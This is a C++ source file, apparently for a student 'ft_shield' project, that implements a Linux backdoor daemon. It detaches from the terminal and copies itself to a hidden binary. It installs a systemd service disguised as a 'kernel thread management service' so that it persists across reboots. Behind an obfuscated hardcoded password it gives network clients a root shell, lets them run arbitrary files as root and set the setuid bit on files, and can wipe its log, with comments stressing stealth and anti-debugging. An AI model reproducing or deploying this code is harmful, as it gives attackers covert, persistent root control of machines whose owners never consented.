#include <iostream>\n#include <fstream>\n#include <string>\n#include <csignal>\n\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/select.h>\n#include <sys/wait.h>\n#include <arpa/inet.h>\n\n#include \"Ft_Shield.hpp\"\n\n#define EXIT_SUCCESS 0\n#define EXIT_FAILURE 1\n\n/*\n * SIGPIPE handler:\n * Ignore broken pipe signal to avoid crash if ft_shield sends a message to\n * a cliant that is dosconnected\n */\nvoid\tbrokenPipe(int signal __attribute__((unused)))\n{\n\treturn;\n}\n/* Constructors ============================================================= */\nFt_Shield::Ft_Shield(void) : _port(4242), _MaxClients(3), _run(true), _maxfd(2), _lockFile(-1), _logFile(-1), _nClients(0)\n{\n\tsockaddr_in\t&addrIn\t= *reinterpret_cast<sockaddr_in *>(&this->_addr);\n\n\t/* Define the server parameters */\n\taddrIn.sin_family = AF_INET;\n\taddrIn.sin_addr.s_addr = inet_addr(\"127.147.6.1\");//INADDR_ANY to permit any local ipv4\n\taddrIn.sin_port = htons(this->_port);\n\n\t/* Map the commands into the command-mapper t_commands */\n\tthis->_cmdMap[\"shutdown\n\"]\t= &Ft_Shield::_shutdown;\n\tthis->_cmdMap[\"rev\n\"]\t\t= &Ft_Shield::_reverseShell;\n\tthis->_cmdMap[\"quit\n\"]\t\t= &Ft_Shield::_disconnect;\n\tthis->_cmdMap[\"help\n\"]\t\t= &Ft_Shield::_help;\n\tthis->_cmdMap[\"elfAsRoot\n\"]= &Ft_Shield::_elfAsRoot;\n\tthis->_cmdMap[\"rootLike\n\"]\t= &Ft_Shield::_rootLike;\n\tthis->_cmdMap[\"clean log\n\"]= &Ft_Shield::_cleanLog;\n\treturn;\n}\n\n/*\n * Unused and useless, just here to have the Copernic form\n */\nFt_Shield::Ft_Shield(const Ft_Shield &shield) : _port(shield._port), _MaxClients(shield._MaxClients)\n{\n\treturn;\n}\n\n/* Destructor =============================================================== */\n/*\n * Close all fd > 2\n * Delete the DAEMON_LOCK_FILE\n * Preserve the log file\n */\nFt_Shield::~Ft_Shield(void)\n{\n\tthis->_buffer = \"You\'ve been disconnected.\n\";\n\tfor (int fd = 3; fd <= this->_maxfd; fd++)\n\t{\n\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t\tclose(fd);\n\t}\n\tremove(DAEMON_LOCK_FILE);\n\treturn;\n}\n\n/* Operators ================================================================ */\n/*\n * Unused and useless, just here to have the Copernic form\n */\nFt_Shield & Ft_Shield::operator=(const Ft_Shield & shield __attribute__((unused)))\n{\n\treturn *this;\n}\n\n/* Public member functions ================================================== */\n/*\n * Two forks to detach from current process and from terminal\n * Start the ft_shield core function\n */\nvoid Ft_Shield::daemonize(void)\n{\n\tint\tpid\t\t= 0;\n\n\t/* Signal handler to ignore broken pipe signal in case of client brutal disconnection */\n\tstd::signal(SIGPIPE, &brokenPipe);\n\t/* First fork to detach from the current processus */\n\tpid = fork();\n\tif (pid == -1)\n\t\texit(EXIT_FAILURE);\n\telse if (pid > 0)\n\t\texit(EXIT_SUCCESS);\n\telse if (pid == 0)\n\t{\n\t\t/* Create a new session */\n\t\tsetsid();\n\t\t/* Second fork to detach from terminal */\n\t\tpid = fork();\n\t\tif (pid == -1)\n\t\t\texit(EXIT_FAILURE);\n\t\telse if (pid > 0)\n\t\t\texit(EXIT_SUCCESS);\n\t\telse if (pid == 0)\n\t\t\tthis->start();\n\t}\n\treturn;\n}\n\n/*\n * Check if another instance is running\n * Init and run the server\n */\nvoid\tFt_Shield::start(void)\n{\n\tchar buf[9] = {\'\0\'};\n\n\t/* Set default permisions */\n\tumask(0000);\n\t/* Open the log file and indentify the beginning of this instance */\n\tthis->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);\n\tif (this->_logFile != -1)\n\t{\n\t\twrite(this->_logFile, \"New log instance:\n\", 18);\n\t\tthis->_maxfd++;\n\t}\n\t/* \n\t * Create a lock file\n\t * Open fails if the file already exists using this flags combination: O_CREAT | O_EXCL\n\t * Fail if another instance of ft_shield is running\n\t */\n\t//this->_checkInstance();\n\tthis->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);\n\tif (this->_run == true && this->_lockFile != -1)\n\t{\n\t\tthis->_maxfd++;\n\t\t/* Write the daemon pid in the lock file */\n\t\tsprintf(buf, \"%d\n\", getpid());\n\t\twrite(this->_lockFile, buf, strlen(buf));\n\t\t/* _mkSrv returns -1 on error, 0 otherwise */\n\t\t if (this->_mkSrv() != -1)\n\t\t\t this->_runSrv();\n\t}\n\treturn;\n}\n\n/*\n * Copy the ft_shield executable in /usr/local/bin/.ft_shield\n * Create a service entry in systemctl to run the program at startup\n */\nvoid\tFt_Shield::setup(char const *me)\n{\n\tint\t\t\t\tpid = -1;\n\tstd::ofstream\tservice(INIT_FILE, std::ios::binary);\n\n\tif (service.is_open())\n\t{\n\t\tservice << \"[Unit]\" << std::endl;\n\t\tservice << \"Description=kernel thread management service\" << std::endl;\n\t\tservice << \"[Service]\" << std::endl;\n\t\tservice << \"ExecStart=\" << COPY_ELF << \" --on-boot\" << std::endl;\n\t\tservice << \"Restart=always\" << std::endl;\n\t\tservice << \"RestartSec=5\" << std::endl;\n\t\tservice << \"StartLimitInterval=60s\" << std::endl;\n\t\tservice << \"StartLimitBurst=3\" << std::endl;\n\t\tservice << \"[Install]\" << std::endl;\n\t\tservice << \"WantedBy=multi-user.target\" << std::endl;\n\t\tservice.close();\n\t\tpid = fork();\n\t\tif (pid != -1 && pid == 0)\n\t\t{\n\t\t\tclose(STDIN_FILENO);\n\t\t\tclose(STDOUT_FILENO);\n\t\t\tclose(STDERR_FILENO);\n\t\t\tsystem(\"systemctl enable \" SERVICE_CFG);\n\t\t\tthis->_exit();\n\t\t}\n\t}\n\tthis->_copy(me);\n\treturn;\n}\n\n/* Private member functions ================================================= */\n/*\n * Check if another instance is already running, quit if yes, continue otherwise\n * Check by process name instead of get a lock file : more stealth\n * NOTE:\n * \tIt\'s a kind of antidebug code because gdb runs several times the process to debug it\n */\nvoid\tFt_Shield::_checkInstance(void)\n{\n\tint\t\tfd[2];\n\tint\t\tpid;\n\tint\t\tcount = 0;\n\tchar\tchar_buf[100] = {\'\0\'};\n\tstd::size_t\tfound = -1;\n\n\t//this->_lockFile = open(DAEMON_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL);\n\tif (pipe(fd) != -1)\n\t{\n\t\t\t/*\n\t\t\t * Check return value of ps axco | grep ft_shield\n\t\t\t * Set this->_run to false if another ft_shield process is running\n\t\t\t */\n\t\tpid = fork();\n\t\tif (pid == 0)\n\t\t{\n\t\t\tclose(fd[0]);\n\t\t\tclose(STDOUT_FILENO);\n\t\t\tdup2(fd[1], STDOUT_FILENO);\n\t\t\tsystem(\"ps axco pid,command | grep ft_shield\");\n\t\t\tthis->_exit();\n\t\t}\n\t\telse if (pid != 0)\n\t\t{\n\t\t\tclose(fd[1]);\n\t\t\twaitpid(pid, NULL, 0);\n\t\t\tread(fd[0], char_buf, 99);\n\t\t\tclose(fd[0]);\n\t\t\tthis->_buffer = char_buf;\n\t\t\twhile (this->_buffer.find(\"ft_shield\", found+1) != std::string::npos)\n\t\t\t{\n\t\t\t\tcount++;\n\t\t\t\tfound = this->_buffer.find(\"ft_shield\", found + 1);\n\t\t\t}\n\t\t\tif (count > 2)\n\t\t\t\tthis->_exit();\n\t\t}\n\t}\n\treturn;\n}\n\n/* \n * Configure a server listening on this->_port (4242)\n *   - Do not block\n *   - Can reuse the address and the port right after closing the server\n *   - Return -1 on error and 0 otherwise\n */\nint\tFt_Shield::_mkSrv(void)\n{\n\tint\topt = 1;\n\n\tthis->_socket = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);\n\tif (this->_socket == -1)\n\t\treturn -1;\n\tthis->_maxfd++;\n\tif (setsockopt(this->_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) == -1)\n\t\treturn -1;\n\tif (bind(this->_socket, &this->_addr, sizeof(this->_addr)) == -1)\n\t\treturn -1;\n\tif (listen(this->_socket, 10) == -1)\n\t\treturn -1;\n\treturn 0;\n}\n\n/*\n * Run a simple server using select api\n * Execute the client command and ignore it if it\'s not a legit command\n * Close the client socket if it is disconnected or sends a \'quit\' string\n */\nvoid\tFt_Shield::_runSrv(void)\n{\n\tsocklen_t\tlenaddr = sizeof(this->_addr);\n\tint\t\t\tclient = -1;\n\tfd_set\t\tmaster_set, read_set, write_set;\n\tchar\t\tchar_buf[100] = {\'\0\'};\n\tint\t\t\tres = 0;\n\n\tthis->_maxfd = this->_socket;\n\tFD_ZERO( &master_set );\n\tFD_SET(this->_socket, &master_set);\n\n\twhile(this->_run)\n\t{\n\t\tread_set = master_set;\n\t\twrite_set = master_set;\n\t\tif (select(this->_maxfd + 1, &read_set, &write_set, NULL, NULL) < 0)\n\t\t\tcontinue;\n\t\tfor(int fd = 0; fd <= this->_maxfd; fd++)\n\t\t{\n\t\t\tif (FD_ISSET(fd, &read_set) && fd == this->_socket)\n\t\t\t{\n\t\t\t\tclient = accept(this->_socket, &this->_addr, &lenaddr);\n\t\t\t\tif (client != -1 && this->_nClients < this->_MaxClients)\n\t\t\t\t{\n\t\t\t\t\tFD_SET(client, &master_set);\n\t\t\t\t\tthis->_maxfd = client > this->_maxfd ? client : this->_maxfd;\n\t\t\t\t\tthis->_nClients++;\n\t\t\t\t\tsend(client, \"Connected to ft_shield:\n\", 24, 0);\n\t\t\t\t\tif (this->_password(client) == -1)\n\t\t\t\t\t\tthis->_disconnect(client);\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tthis->_buffer = \"Password granted.\n\";\n\t\t\t\t\t\tsend(client, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (client != -1)\n\t\t\t\t{\n\t\t\t\t\tsend(client, \"Sorry, too much connexions\n\", 28, 0);\n\t\t\t\t\tclose(client);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (FD_ISSET(fd, &read_set) && fd != this->_socket)\n\t\t\t{\n\t\t\t\t/*\n\t\t\t\t * if res == 0 : disconnection case\n\t\t\t\t * MSG_PEEK permits to read data without taking them off the queue\n\t\t\t\t */\n\t\t\t\tres = recv(fd, char_buf, 99, MSG_PEEK);\n\t\t\t\tif (res <= 0)\n\t\t\t\t\tthis->_disconnect(fd);\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tres = recv(fd, char_buf, 99, 0);\n\t\t\t\t\tthis->_buffer = char_buf;\n\t\t\t\t\tbzero(char_buf, 100);\n\t\t\t\t\tif (this->_cmdMap.find(this->_buffer) != this->_cmdMap.end())\n\t\t\t\t\t\t( this->*( this->_cmdMap[this->_buffer] ) )(fd);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn;\n}\n\n/*\n * This function exit the process if needed: another instance alreaddy running\n * Function closing all the file descriptor before exiting\n * Doesn\'t remove the log and lock files\n */\nvoid\tFt_Shield::_exit(void)\n{\n\tthis->_run = false;\n\tfor (int fd = 3; fd <= this->_maxfd; fd++)\n\t\tclose(fd);\n\n\texit(EXIT_SUCCESS);\n}\n\n/*\n * set this->_run to false and the server loop won\'t be launched\n */\nvoid\tFt_Shield::_shutdown(int fd __attribute__((unused)))\n{\n\tthis->_run = false;\n\treturn;\n}\n\n/*\n * Open a reverse shell to the client asking for it:\n *  Child process:\n *   - redirect stdin, stdout and stderr to the cliend fd\n *   - excve a shell\n *  Parent process:\n *   - Disconnect the client from ft_shield to avoid fd conflict\n */\nvoid\tFt_Shield::_reverseShell(int fd)\n{\n\tint\t\tpid = -1;\n\tchar\t*shell[2];\n\tchar\tcmd[8] = \"/bin/sh\";\n\tchar\t*arg = NULL;\n\n\tshell[0] = cmd;\n\tshell[1] = arg;\n\tpid = fork();\n\tif (pid != -1 && pid == 0)\n\t{\n\t\tclose(STDIN_FILENO);\n\t\tclose(STDOUT_FILENO);\n\t\tclose(STDERR_FILENO);\n\t\tdup2(fd, STDIN_FILENO);\n\t\tdup2(fd, STDOUT_FILENO);\n\t\tdup2(fd, STDERR_FILENO);\n\t\tclose(fd);\n\t\tif (execve(shell[0], shell, NULL) == -1)\n\t\t\tthis->_exit();\n\t}\n\telse if (pid != -1 && pid > 0)\n\t{\n\t\tclose(fd);\n\t\tthis->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;\n\t\tthis->_nClients--;\n\t}\n\treturn;\n}\n\n/*\n * Disconnect a client closing its fd\n */\nvoid\tFt_Shield::_disconnect(int fd)\n{\n\tthis->_buffer = \"You\'ve been disconnected.\n\";\n\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\tclose(fd);\n\tthis->_maxfd = (fd == this->_maxfd) ? --this->_maxfd : this->_maxfd;\n\tthis->_nClients--;\n\treturn;\n}\n\n/*\n * Simple help menu associated to the help command\n * Should be a const function but isn\'t for compatibility with t_commands\n */\nvoid\tFt_Shield::_help(int fd)\n{\n\tstd::string\thelp;\n\n\thelp = \"ft_shield list of commands:\n\";\n\thelp += \"\t- shutdown  : terminate ft_shield and erase tracks\n\";\n\thelp += \"\t- quit      : disconnect you from ft_shield\n\";\n\thelp += \"\t- rev       : open a shell with root rights\n\";\n\thelp += \"\t- elfAsRoot : run any file with root priviliges\n\";\n\thelp += \"\t- rootLike  : modify file permissions to run an elf as root by a non priviliged user\n\";\n\thelp += \"\t- clean log : remove the log file and create a new one\n\"; \n\tsend(fd, help.c_str(), help.length(), 0);\n\treturn;\n}\n\n/*\n * Ask for password, wait 8s\n * Calculation between values for obfuscation\n * Password: P@ylo@d42\n\0\n * The \n is due to the input in netcat\n */\nint\tFt_Shield::_password(int fd) const\n{\n\tstd::string\t\tmsg = \"You have 8s to enter the password:\n\";\n\tchar\t\t\tchar_buf[15] = {\'\0\'};\n\tint\t\t\t\tres = 0;\n\tunsigned int\ttime = 0;\n\n\tsend(fd, msg.c_str(), msg.length(), 0);\n\twhile (res <= 0 && time < 8)\n\t{\n\t\tres = recv(fd, char_buf, 14, MSG_PEEK | MSG_DONTWAIT);\n\t\tsleep(1);\n\t\ttime++;\n\t}\n\tres = recv(fd, char_buf, 14, MSG_DONTWAIT);\n\tif (res <= 0)\n\t{\n\t\tmsg = \"Sorry, time elapsed.\n\";\n\t\tsend(fd, msg.c_str(), msg.length(), 0);\n\t\treturn -1;\n\t}\n\telse\n\t{\n\t\tmsg = char_buf;\n\t\tif (msg[0] == 0x50 && msg[1] == msg[0] - 0x10 && msg[2] == msg[1] + 0x39)\n\t\t{\n\t\t\tif ((msg[4] - msg[3]) == 0x3 && msg[3] == 0x6c)\n\t\t\t{\n\t\t\t\tif (msg[1] == msg[5] && msg[1] + 0x24 == msg[6])\n\t\t\t\t{\n\t\t\t\t\tif (msg[8] == 0x32 && msg[7] == (msg[8] + 2) && (msg[9] - msg[10]) == 0xa)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (msg[10] == 0)\n\t\t\t\t\t\t\treturn 0;\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\treturn -1;\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\treturn -1;\n\t\t\t}\n\t\t\telse\n\t\t\t\treturn -1;\n\t\t}\n\t\telse\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\n/*\n * Run any file as root after checking the file exists \n */\nvoid\tFt_Shield::_elfAsRoot(int fd)\n{\n\tint\t\t\t\tpid = 0;\n\tint\t\t\t\tres = 0;\n\tchar\t\t\tchar_buf[100] = {\'\0\'};\n\tunsigned int\ttime = 0;\n\tchar\t\t\t*file[2];\n\n\tfile[0] = char_buf;\n\tfile[1] = NULL;\n\tthis->_buffer = \"You have 10s to enter the absolute file path:\n\";\n\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\twhile (res <= 0 && time < 10)\n\t{\n\t\tres = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);\n\t\tsleep(1);\n\t\ttime++;\n\t}\n\tres = recv(fd, char_buf, 99, MSG_DONTWAIT);\n\tif (res <= 0)\n\t{\n\t\tthis->_buffer = \"Sorry, time elapsed.\n\";\n\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t\treturn;\n\t}\n\telse\n\t{\n\t\tchar_buf[res - 1] = \'\0\';\n\t\tif (access(char_buf, F_OK) != -1)\n\t\t{\n\t\t\tpid = fork();\n\t\t\tif (pid != -1 && pid == 0)\n\t\t\t{\n\t\t\t\tif (execve(file[0], file, NULL) == -1)\n\t\t\t\t{\n\t\t\t\t\tthis->_buffer = \"Error executing the file.\n\";\n\t\t\t\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t\t\t\t\tthis->_exit();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (pid != -1 && pid != 0)\n\t\t\t\tthis->_buffer = \"Program launched.\n\";\n\t\t\telse\n\t\t\t\tthis->_buffer = \"Error executing the file.\n\";\n\t\t}\n\t\telse\n\t\t\tthis->_buffer = \"Error: no such file.\n\";\n\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t}\n\treturn;\n}\n\n/*\n * Change the owner of the file to root\n * Set the setuid bit for the selected file\n * In other words, any unprivileged user would be able to launch the program as root\n */\nvoid\tFt_Shield::_rootLike(int fd)\n{\n\tint\t\t\t\tres = 0;\n\tchar\t\t\tchar_buf[100] = {\'\0\'};\n\tunsigned int\ttime = 0;\n\n\tthis->_buffer = \"You have 10s to enter the absolute file path:\n\";\n\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\twhile (res <= 0 && time < 10)\n\t{\n\t\tres = recv(fd, char_buf, 99, MSG_PEEK | MSG_DONTWAIT);\n\t\tsleep(1);\n\t\ttime++;\n\t}\n\tres = recv(fd, char_buf, 99, MSG_DONTWAIT);\n\tif (res <= 0)\n\t{\n\t\tthis->_buffer = \"Sorry, time elapsed.\n\";\n\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t\treturn;\n\t}\n\telse\n\t{\n\t\tchar_buf[res - 1] = \'\0\';\n\t\tif (chown(char_buf, 0, 0) == 0 && chmod(char_buf, 04777) == 0)\n\t\t\tthis->_buffer = \"Setuid bit correctly set.\n\";\n\t\telse\n\t\t\tthis->_buffer = \"Error: no suche file.\n\";\n\t\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\t}\n\treturn;\n}\n\n/*\n * Remove the existing COPY_ELF\n * Copy the file to the specified location in COPY_FILE macro\n */\nvoid\tFt_Shield::_copy(char const *me) const\n{\n\tremove(COPY_ELF);\n\n\tstd::ifstream\tsrc(me, std::ios::binary);\n\tstd::ofstream\tdst(COPY_ELF, std::ios::binary);\n\n\tif (src.is_open() && dst.is_open())\n\t{\n\t\tdst << src.rdbuf();\n\t\tsrc.close();\n\t\tdst.close();\n\t\tchmod(COPY_ELF, 00700);\n\t}\n\treturn;\n}\n\n/*\n * Clean the log file and create a new one empty\n */\nvoid\tFt_Shield::_cleanLog(int fd __attribute__((unused)))\n{\n\tclose(this->_logFile);\n\tif (remove(DAEMON_LOG_FILE) == -1)\n\t\tthis->_buffer = \"Deletion failed\";\n\telse\n\t{\n\t\tthis->_logFile = open(DAEMON_LOG_FILE, O_RDWR | O_CREAT | O_APPEND);\n\t\tif (this->_logFile == -1)\n\t\t\tthis->_buffer = \"Log file deleted and new one has been created.\n\";\n\t\telse\n\t\t\tthis->_buffer = \"Log file deleted but creation of a new log file failed.\n\";\n\t}\n\tsend(fd, this->_buffer.c_str(), this->_buffer.length(), 0);\n\treturn;\n}\n